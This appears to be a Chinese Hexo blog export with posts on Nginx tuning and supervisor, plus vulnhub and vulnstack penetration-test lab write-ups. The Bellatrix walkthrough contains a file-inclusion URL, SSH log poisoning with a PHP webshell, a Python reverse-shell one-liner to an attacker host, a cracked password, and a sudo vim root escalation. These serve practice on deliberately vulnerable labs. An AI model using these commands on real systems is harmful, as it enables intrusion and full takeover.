    <url>/2021/08/11/blog_formal/%E5%BC%80%E5%8F%91/%E7%BB%84%E4%BB%B6/Nginx%E5%8A%A0%E9%80%9F%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h1 id="Nginx加速响应"><a href="#Nginx加速响应" class="headerlink" title="Nginx加速响应"></a>Nginx加速响应</h1><p>​    如果你想改变世界，就从铺床开始吧！铺完床在优化下你的<code>HTTP</code>服务配置</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    博客的响应过慢，本文通过修改<code>nginx</code>配置加速网站响应</p>
<p>​    当前博客首页响应：</p>
<p><img data-src="./Nginx%E5%8A%A0%E9%80%9F%E5%93%8D%E5%BA%94/1.png" alt></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="启用Gzip压缩-Enabling-Gzip-Compression-for-HTML-CSS-and-JavaScript-Files"><a href="#启用Gzip压缩-Enabling-Gzip-Compression-for-HTML-CSS-and-JavaScript-Files" class="headerlink" title="启用Gzip压缩(Enabling Gzip Compression for HTML, CSS, and JavaScript Files)"></a>启用<code>Gzip</code>压缩(Enabling Gzip Compression for HTML, CSS, and JavaScript Files)</h3><p>​    众所周知，网站上构建页面的 <code>HTML</code>，<code>CSS</code> 和<code>JavaScript</code>文件可能非常庞大,默认情况下<code>nginx.conf</code>文件中此配置是禁用的，开启配置如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip on;</span><br><span class="line">gzip_types application/xml</span><br><span class="line">    application/json</span><br><span class="line">    text/css</span><br><span class="line">    text/javascript</span><br><span class="line">    application/javascript;</span><br><span class="line">gzip_vary on;</span><br><span class="line">gzip_comp_level 6;</span><br><span class="line">gzip_min_length 500;</span><br></pre></td></tr></table></figure>

<h3 id="设置缓存头-Setting-Cache-Headers"><a href="#设置缓存头-Setting-Cache-Headers" class="headerlink" title="设置缓存头(Setting Cache Headers)"></a>设置缓存头(Setting Cache Headers)</h3><p>​    浏览器检索网页文件(比如字体 图片等)时，会将副本保留在本地磁盘缓存中。当你再次访问此页面时，浏览器就不必从服务器重新获取文件。作为网站所有者，可以在发送的 <code>HTTP</code> 响应中设置缓存控制和过期标头，以提高浏览器的缓存行为的效率，从而减少很多不必要的 <code>HTTP</code> 请求</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location ~* \.(?:jpg|jpeg|gif|png|ico|woff2)$ &#123;</span><br><span class="line">    expires 1M; # 本地缓存一个月</span><br><span class="line">    add_header Cache-Control "public";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启用http2协议-Enabling-HTTP-2-Protocol-Support"><a href="#启用http2协议-Enabling-HTTP-2-Protocol-Support" class="headerlink" title="启用http2协议(Enabling HTTP/2 Protocol Support)"></a>启用<code>http2</code>协议(Enabling HTTP/2 Protocol Support)</h3><p>​    <code>HTTP/2</code> 是用于服务网页的下一代协议，旨在更好地利用网络和主机服务器,<code>Nginx1.9.5</code> 及更高版本中已经支持了 <code>HTTP/2</code>协议,此项需要启用<code>TLS</code>才能正常使用<code>HTTP/2</code>协议</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">listen 443 ssl http2;</span><br></pre></td></tr></table></figure>

<p>在线检测网站能否开启<code>HTTP/2</code></p>
<p><a href="https://http2.pro/" target="_blank" rel="noopener">https://http2.pro/</a></p>
<p><img data-src="./Nginx%E5%8A%A0%E9%80%9F%E5%93%8D%E5%BA%94/2.png" alt></p>
<h3 id="优化日志-Optimizing-Logging"><a href="#优化日志-Optimizing-Logging" class="headerlink" title="优化日志(Optimizing Logging)"></a>优化日志(Optimizing Logging)</h3><ul>
<li>禁用页面资源请求的日志记录,不需要记录检索普通页面资源的请求，比如图像文件、<code>JavaScript</code> 文件和 <code>CSS</code> 文件等</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location ~* \.(?:jpg|jpeg|gif|png|ico|woff2|js|css)$ &#123;</span><br><span class="line">    access_log off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>禁用成功请求的日志</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /etc/nginx/nginx.conf</span></span><br><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line"><span class="meta">#</span><span class="bash"> access_log directive</span></span><br><span class="line">map $status $loggable &#123;</span><br><span class="line">    ~^[23] 0;</span><br><span class="line">    default 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">access_log /var/log/nginx/access.log combined if=$loggable;</span><br></pre></td></tr></table></figure>

<ul>
<li>最小化<code>I/O</code>操作， 即使你要记录所有请求，也可以通过打开访问日志缓冲来最大程度地减少<code>I/O</code> 操作。使用此指令，<code>Nginx</code>将等待将日志数据写入磁盘，直到填满<code>512KB</code> 缓冲区或自上次刷新以来已过了 <code>1</code> 分钟（以先发生者为准）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">access_log /var/log/nginx/access.log combined buffer=512k flush=1m;</span><br></pre></td></tr></table></figure>

<h3 id="限制带宽-Limiting-Bandwidth-for-Particular-URLs"><a href="#限制带宽-Limiting-Bandwidth-for-Particular-URLs" class="headerlink" title="限制带宽(Limiting Bandwidth for Particular URLs)"></a>限制带宽(Limiting Bandwidth for Particular URLs)</h3><ul>
<li>如果服务器提供较大的文件(或较小但非常受欢迎的文件，例如表单或报表文件等)，则设置客户端下载文件的最大速度是一个非常有用的选择。如果你的站点已经承受了很高的网络负载，则限制下载速度会留下更多带宽，以使应用程序的关键部分保持响应</li>
<li>如下，利用<code>limit</code>指令限制特定<code>URL</code>的带宽</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location /download/ &#123;</span><br><span class="line">    limit_rate 50k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果想只限制大文件，我们同样可以前一定流量限制速度，达到一定流量指标降速如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    limit_rate_after 500k;</span><br><span class="line">    limit_rate 50k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>备注：最终效果待补图</p>
]]></content>
      <categories>
        <category>组件</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>组件</tag>
      </tags>
  </entry>
  <entry>
    <title>supervisor随笔</title>
    <url>/2021/01/24/blog_formal/%E5%BC%80%E5%8F%91/%E7%BB%84%E4%BB%B6/supervisor%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="supervisor随笔"><a href="#supervisor随笔" class="headerlink" title="supervisor随笔"></a>supervisor随笔</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>python实现的类systemctl进程保活工具，比较牛逼</p>
<a id="more"></a>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> centos7下  supervisor的安装</span></span><br><span class="line">yum install -y supervisor</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开机自启</span></span><br><span class="line">systemctl enable supervisord</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[root@VM_0_3_centos hooks]# systemctl enable supervisord</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/supervisord.service to /usr/lib/systemd/system/supervisord.service.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">systemctl start supervisord</span><br></pre></td></tr></table></figure>

<p>单个进程配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[program:hexo]</span><br><span class="line">directory = /home/git/hexo                                         ;启动目录</span><br><span class="line">command =  hexo server -p 4000                            ;启动命令</span><br><span class="line">autostart = true                                          ;在supervisord启动的时候也启动</span><br><span class="line">startsecs = 10                                                   ;启动5秒后没有异常退出，就当作已经正常启动了</span><br><span class="line">autorestart = true                                            ;程序异常退出后自动重启</span><br><span class="line">startretries = 3                                                ;启动失败自动重试次数，默认是3</span><br><span class="line">user = root                                                      ;哪个用户启动</span><br><span class="line">;redirect_stderr = true                                      ;把stderr重定向到stdout，默认false</span><br><span class="line">;stdout_logfile_maxbytes = 20MB                    ;stdout日志文件大小，默认50MB</span><br><span class="line">;stdout_logfile_backups = 20                           ;stdout日志文件备份数</span><br><span class="line">;stdout_logfile = /root/eolinker_os/logs/eolinker_os_stdout.log</span><br><span class="line">;stdout日志文件，需要手动创建/root/eolinker_os/logs目录</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 添加进程后</span></span><br><span class="line">supervisor update</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>组件</category>
      </categories>
      <tags>
        <tag>组件</tag>
        <tag>supervisor</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack1</title>
    <url>/2021/07/31/blog_formal/security/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnstack/vulnstack1/</url>
    <content><![CDATA[<h1 id="vulnstack1"><a href="#vulnstack1" class="headerlink" title="vulnstack1"></a>vulnstack1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的内网靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>vulnstack1</li>
<li>windows10</li>
</ul>
<p>靶场基础环境如下:</p>
<p><img data-src="./vulnstack1/1.png" alt></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li>主机探测</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/usr/share/wordlists# nmap -sn 192.168.1.0/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-31 13:45 EDT</span><br><span class="line">Nmap scan report for OpenWrt.lan (192.168.1.1)</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: D8:C8:E9:FE:BE:88 (Phicomm (Shanghai))</span><br><span class="line">Nmap scan report for esxi.lan (192.168.1.2)</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">MAC Address: 20:41:10:1A:04:8C (Unknown)</span><br><span class="line">Nmap scan report for DSM.lan (192.168.1.3)</span><br><span class="line">Host is up (0.00012s latency).</span><br><span class="line">MAC Address: 00:11:32:73:68:3B (Synology Incorporated)</span><br><span class="line">Nmap scan report for kali2021.lan (192.168.1.102)</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 00:0C:29:47:5C:20 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.109</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line">MAC Address: 40:31:3C:22:9C:F3 (Xiaomi Electronics,co.)</span><br><span class="line">Nmap scan report for stu1.lan (192.168.1.122)</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">MAC Address: D0:C6:37:BE:7E:B3 (Unknown)</span><br><span class="line">Nmap scan report for DESKTOP-O61FCVR.lan (192.168.1.188)</span><br><span class="line">Host is up (0.095s latency).</span><br><span class="line">MAC Address: D0:C6:37:BE:7E:B3 (Unknown)</span><br><span class="line">Nmap scan report for 192.168.1.189</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: B0:25:AA:2D:F5:9B (Private)</span><br><span class="line">Nmap scan report for kali2020.lan (192.168.1.101)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (9 hosts up) scanned in 2.52 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li><p>目标主机为 <code>192.168.1.122</code></p>
</li>
<li><p>端口扫描</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -T5 -A -p- 192.168.1.122</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/usr/share/wordlists# nmap -sS -sV -T5 -A -p- 192.168.1.122</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-31 13:46 EDT</span><br><span class="line">Nmap scan report for stu1.lan (192.168.1.122)</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014</span><br><span class="line">5357/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">MAC Address: D0:C6:37:BE:7E:B3 (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 2008|7|8.1|Vista</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1</span><br><span class="line">OS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows 8.1 R1, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.25 ms stu1.lan (192.168.1.122)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 105.02 seconds</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网靶场</category>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>内网渗透测试</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>Bellatrix</title>
    <url>/2021/06/12/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Bellatrix/</url>
    <content><![CDATA[<h1 id="Bellatrix"><a href="#Bellatrix" class="headerlink" title="Bellatrix"></a>Bellatrix</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Bellatrix</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/Bellatrix# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:3b:17:d5, IPv4: 192.168.43.92</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    42:bc:b8:53:66:d8       (Unknown: locally administered)</span><br><span class="line">192.168.43.39   08:00:27:c4:55:df       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.938 seconds (132.09 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.39</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.39</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/Bellatrix# nmap -sC -sV -p- 192.168.43.39</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 00:09 EDT</span><br><span class="line">Nmap scan report for 192.168.43.39</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 4b:ce:c7:5a:9c:1f:8b:cd:47:03:08:69:85:c2:91:49 (RSA)</span><br><span class="line">|   256 a1:2a:a8:15:99:04:cc:2a:1e:e3:50:00:f3:55:c2:cc (ECDSA)</span><br><span class="line">|_  256 2c:d3:ec:6f:4f:5b:4a:e0:ea:0a:c3:0d:2f:cb:78:17 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: AvadaKedavra</span><br><span class="line">MAC Address: 08:00:27:C4:55:DF (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.01 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Bellatrix/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.39/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi# gobuster dir -u http://192.168.43.39/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.39/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/06/12 00:10:41 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 1728]</span><br><span class="line">/server-status        (Status: 403) [Size: 278] </span><br><span class="line">                                                </span><br><span class="line">===============================================================</span><br><span class="line">2021/06/12 00:13:14 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Bellatrix/2.png" alt></p>
<ul>
<li>右键查看源代码发现提示</li>
</ul>
<p><img data-src="./Bellatrix/3.png" alt></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>view-source:<a href="http://192.168.43.39/ikilledsiriusblack.php?file=/etc/passwd" target="_blank" rel="noopener">http://192.168.43.39/ikilledsiriusblack.php?file=/etc/passwd</a></p>
<p><img data-src="./Bellatrix/4.png" alt></p>
<ul>
<li>日志投毒</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh '&lt;?php system($_GET[weiyi])?&gt;'@192.168.43.39</span><br></pre></td></tr></table></figure>

<p><img data-src="./Bellatrix/5.png" alt></p>
<p><img data-src="./Bellatrix/6.png" alt></p>
<ul>
<li>反弹shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.43.39/ikilledsiriusblack.php?file=/var/log/auth.log&amp;weiyi=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.43.92",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Bellatrix/7.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>发现敏感目录</li>
</ul>
<p><img data-src="./Bellatrix/8.png" alt></p>
<p><img data-src="./Bellatrix/9.png" alt></p>
<p><img data-src="./Bellatrix/10.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lestrange:$6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0</span><br></pre></td></tr></table></figure>

<ul>
<li>发现密码本</li>
</ul>
<p><img data-src="./Bellatrix/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@weiyi:/home/weiyi/vulnhub/Bellatrix# john --show shadow </span><br><span class="line">lestrange:ihateharrypotter</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获得账号密码</span></span><br><span class="line">lestrange / ihateharrypotter</span><br></pre></td></tr></table></figure>

<p><img data-src="./Bellatrix/12.png" alt></p>
<ul>
<li><code>vim</code>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim -c ':!/bin/sh'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Bellatrix/13.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Hogwarts</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Aragog</title>
    <url>/2022/01/23/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Aragog/</url>
    <content><![CDATA[<h1 id="Aragog"><a href="#Aragog" class="headerlink" title="Aragog"></a>Aragog</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Aragog</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Aragog&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.60    40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.101   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.145   c0:e7:3e:cb:56:6f       (Unknown)</span><br><span class="line">192.168.1.181   00:e0:70:d9:ab:16       DH TECHNOLOGY</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line"></span><br><span class="line">12 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.969 seconds (130.02 hosts/sec). 12 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.239</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.1.101</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">──(root💀weiyi)-[/home/weiyi/vulnhub/Aragog]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.239</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 04:40 EDT</span><br><span class="line">Nmap scan report for 192.168.43.239</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)</span><br><span class="line">|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)</span><br><span class="line">|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:8E:68:CA (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Aragog/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.239/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.48/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.48/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/10 08:18:00 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 97]</span><br><span class="line">/blog                 (Status: 301) [Size: 313] [--&gt; http://192.168.43.48/blog/]</span><br><span class="line">/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.43.48/javascript/]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                       </span><br><span class="line">                                                                                      </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/10 08:20:35 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.43.239/blog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# 